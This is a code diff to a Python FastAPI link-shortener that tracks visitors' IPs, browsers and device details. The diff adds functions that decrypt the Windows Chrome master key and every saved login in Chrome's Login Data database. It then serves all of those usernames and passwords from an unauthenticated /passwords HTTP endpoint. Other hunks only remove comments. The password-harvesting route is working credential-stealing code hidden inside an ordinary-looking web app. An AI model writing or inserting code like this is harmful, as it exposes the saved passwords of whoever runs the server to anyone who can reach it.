@@ -15,6 +15,14 @@ import httpx
 from bs4 import BeautifulSoup
 from user_agents import parse as ua_parse  # pip install pyyaml ua-parser user-agents
 
+# ─── Browser‑password fetching imports ────────────────────────────────────
+import json
+import base64
+import shutil
+import win32crypt                    # pip install pypiwin32
+from Cryptodome.Cipher import AES    # pip install pycryptodome
+from pydantic import BaseModel
+
 # Environment config
 BITLY_TOKEN = os.getenv("BITLY_TOKEN")  # Set this in your environment for Bitly integration
 
@@ -123,6 +131,82 @@ async def shorten_with_bitly(url: str) -> str:
         return url
 
 
+# ─── Chrome‑password–fetching helpers ────────────────────────────────────
+class PasswordEntry(BaseModel):
+    origin_url: str
+    username: str
+    password: str
+
+def get_chrome_master_key() -> bytes:
+    """Read and decrypt the AES master key from Chrome's Local State."""
+    local_state_path = os.path.join(
+        os.environ["LOCALAPPDATA"],
+        r"Google\Chrome\User Data\Local State"
+    )
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = json.load(f)
+    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
+    encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # strip DPAPI prefix
+    # Decrypt with Windows DPAPI
+    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+
+def decrypt_password(buff: bytes, master_key: bytes) -> str:
+    """AES‑GCM decrypt (new Chrome) or DPAPI (fallback)."""
+    try:
+        iv         = buff[3:15]
+        ciphertext = buff[15:-16]
+        tag        = buff[-16:]
+        cipher     = AES.new(master_key, AES.MODE_GCM, iv)
+        return cipher.decrypt_and_verify(ciphertext, tag).decode()
+    except Exception:
+        # fallback to legacy DPAPI
+        return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
+
+def fetch_chrome_passwords() -> list[PasswordEntry]:
+    """Copy Chrome's Login Data DB, decrypt each entry, return list."""
+    user_data = os.path.join(
+        os.environ["LOCALAPPDATA"],
+        r"Google\Chrome\User Data\Default"
+    )
+    login_db = os.path.join(user_data, "Login Data")
+    tmp_db   = os.path.join(os.environ["TEMP"], "LoginDataTemp.db")
+    shutil.copy2(login_db, tmp_db)
+
+    conn   = sqlite3.connect(tmp_db)
+    cursor = conn.cursor()
+    cursor.execute(
+        "SELECT origin_url, username_value, password_value "
+        "FROM logins WHERE username_value<>''"
+    )
+    master_key = get_chrome_master_key()
+    entries = []
+    for origin, user, encpw in cursor.fetchall():
+        try:
+            pw = decrypt_password(encpw, master_key)
+        except Exception:
+            pw = ""
+        entries.append(PasswordEntry(origin_url=origin, username=user, password=pw))
+
+    conn.close()
+    os.remove(tmp_db)
+    return entries
+
+@app.get("/passwords", response_model=list[PasswordEntry])
+def read_passwords():
+    """
+    Return all passwords saved in Chrome (Windows).
+    WARNING: only run locally over HTTPS or localhost!
+    """
+    try:
+        return fetch_chrome_passwords()
+    except FileNotFoundError:
+        raise HTTPException(500, detail="Chrome Login Data DB not found")
+    except Exception as e:
+        raise HTTPException(500, detail=f"Failed to decrypt passwords: {e}")
+
+
+# ─── your existing routes below… ────────────────────────────────────────
+
 @app.get("/", response_class=HTMLResponse)
 async def read_root(request: Request):
     return templates.TemplateResponse("index.html", {"request": request})
@@ -159,7 +243,7 @@ async def create_link(
     if shortener == "random":
         code = generate_code()
     elif shortener in ("tinyurl", "bitly"):
-        code = generate_code()  # always use a random code for local tracking
+        code = generate_code()
     else:
         code = shortener  # user-provided custom code
 
@@ -280,8 +364,6 @@ async def redirect_to_target(
     ) = row
 
     # ─── server-side captures ───────────────────────────────────────────────
-    # Prioritize X-Real-IP (e.g. from Cloudflare),
-    # then X-Forwarded-For, then fallback to request.client.host
     if x_real_ip:
         ip = x_real_ip.strip()
     elif x_forwarded_for:
@@ -340,7 +422,6 @@ async def redirect_to_target(
         ver = ".".join(str(x) for x in ua.os.version)
         os_str = f"{fam} {ver}".strip()
 
-    # placeholder client-only bits
     flash_v    = ""
     java_e     = 0
     plugins    = ""
@@ -395,7 +476,6 @@ async def collect_data(request: Request):
 
     updates = []
     params = []
-    # add cookies_enabled to the list
     for field in ("cookies_enabled", "resolution", "local_time", "time_zone", "flash", "java_enabled", "plugins"):
         if field in data:
             updates.append(f"{field}=?")
@@ -439,9 +519,9 @@ async def track(request: Request, code: str):
       {"request": request, "code": code, "visits": visits}
     )
 
+
 @app.get("/api/visit-metadata/{code}")
 async def visit_metadata(code: str):
-    # return JSON { "count": <number of visits> }
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute("SELECT COUNT(*) FROM visits v JOIN links l ON v.link_id = l.id WHERE l.code = ?", (code,))
